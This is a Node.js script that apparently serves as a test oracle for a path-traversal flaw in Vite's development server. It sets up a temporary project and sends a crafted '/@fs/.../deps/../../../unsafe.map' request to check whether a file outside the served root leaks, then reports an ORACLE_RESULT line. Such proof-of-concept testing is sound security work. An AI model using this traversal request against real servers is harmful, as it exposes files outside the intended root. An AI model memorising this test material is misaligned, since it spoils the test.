const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  try {
    const vite = require('vite');

    const marker = 'vite-map-traversal-' + process.pid + '-' + Date.now();
    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'root');
    const srcDir = path.join(root, 'src');
    const depDir = path.join(root, 'node_modules', '.vite', 'deps');
    const outsideMap = path.join(base, 'unsafe.map');

    fs.mkdirSync(srcDir, { recursive: true });
    fs.mkdirSync(depDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body><script type="module" src="/src/main.js"></script></body></html>');
    fs.writeFileSync(path.join(srcDir, 'main.js'), 'export const alive = 1; console.log(alive);');
    fs.writeFileSync(path.join(depDir, 'entry.js'), 'export const dep = 1;');
    fs.writeFileSync(outsideMap, JSON.stringify({ version: 3, file: 'x.js', marker, sources: [], names: [], mappings: '' }));

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'spa',
      server: {
        host: true,
        port: 0,
        fs: { strict: true }
      }
    });

    await server.listen();

    const benign = await server.transformRequest('/src/main.js');
    if (!benign || typeof benign.code !== 'string' || benign.code.indexOf('alive = 1') === -1) {
      throw new Error('benign operation failed');
    }

    operation_completed = true;

    const maliciousUrl = '/@fs/' + root.split(path.sep).join('/') + '/node_modules/.vite/deps/../../../unsafe.map';

    try {
      const res = await server.transformRequest(maliciousUrl);
      const code = res && typeof res.code === 'string' ? res.code : '';
      if (code.includes(marker)) {
        exploit_succeeded = true;
        evidence = 'out-of-root sourcemap contents were returned';
      } else {
        exploit_succeeded = false;
        evidence = 'malicious sourcemap request did not expose marker';
      }
    } catch (err) {
      exploit_succeeded = false;
      evidence = 'malicious sourcemap request blocked';
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup or benign call failed: ' + (err && err.message ? err.message : String(err));
  } finally {
    if (server) {
      try {
        await server.close();
      } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();